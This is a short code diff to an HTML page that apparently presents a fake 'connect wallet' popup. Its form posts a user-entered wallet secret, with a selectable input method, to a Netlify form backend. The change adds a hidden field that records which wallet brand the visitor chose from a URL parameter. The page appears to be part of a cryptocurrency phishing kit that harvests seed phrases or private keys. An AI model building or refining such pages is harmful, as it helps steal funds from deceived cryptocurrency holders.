@@ -9,6 +9,7 @@
 <body class="wallet-body">
 
   <div class="popup-overlay">
+    <input type="hidden" id="wallet-name-input" name="wallet-name" />
     <form name="wallet-connect" method="POST" data-netlify="true" class="popup-box">
   <input type="hidden" name="form-name" value="wallet-connect" />
   <input type="hidden" id="method-input" name="method" />
@@ -38,7 +39,7 @@
     const walletName = params.get('wallet') || 'Wallet';
     document.getElementById('wallet-name').textContent = walletName;
     document.getElementById('wallet-logo').src = `images/logos/${walletName.toLowerCase().replace(/\s/g, '')}.png`;
-
+document.getElementById('wallet-name-input').value = walletName;
     document.getElementById('method-select').addEventListener('change', () => {
       const input = document.getElementById('wallet-input');
       const type = document.getElementById('method-select').value;
